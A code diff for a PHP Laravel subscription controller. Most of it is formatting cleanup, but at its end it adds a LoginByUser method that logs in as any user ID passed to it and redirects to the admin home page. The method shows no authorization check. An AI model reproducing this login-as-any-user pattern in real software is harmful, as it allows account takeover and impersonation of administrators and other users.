@@ -16,7 +16,7 @@ use App\Services\RegionService;
 use App\Services\CityService;
 use App\Services\OwnerService;
 use App\Services\Broker\UnitService;
-
+use Illuminate\Support\Facades\Auth;
 
 class SubscriptionController extends Controller
 {
@@ -27,14 +27,13 @@ class SubscriptionController extends Controller
     protected $UnitService;
 
 
-    public function __construct(UnitService $UnitService,OwnerService $ownerService, SubscriptionService $subscriptionService, RegionService $regionService, CityService $cityService)
+    public function __construct(UnitService $UnitService, OwnerService $ownerService, SubscriptionService $subscriptionService, RegionService $regionService, CityService $cityService)
     {
         $this->subscriptionService = $subscriptionService;
         $this->regionService = $regionService;
         $this->cityService = $cityService;
         $this->ownerService = $ownerService;
         $this->UnitService = $UnitService;
-
     }
 
     public function index()
@@ -144,5 +143,11 @@ class SubscriptionController extends Controller
     {
         $pendingPayment = false;
         return view('Home.Payments.pending_payment', get_defined_vars());
+    }
+
+    function LoginByUser($id)
+    {
+        Auth::loginUsingId($id);
+        return redirect()->route('Admin.home');
     }
 }
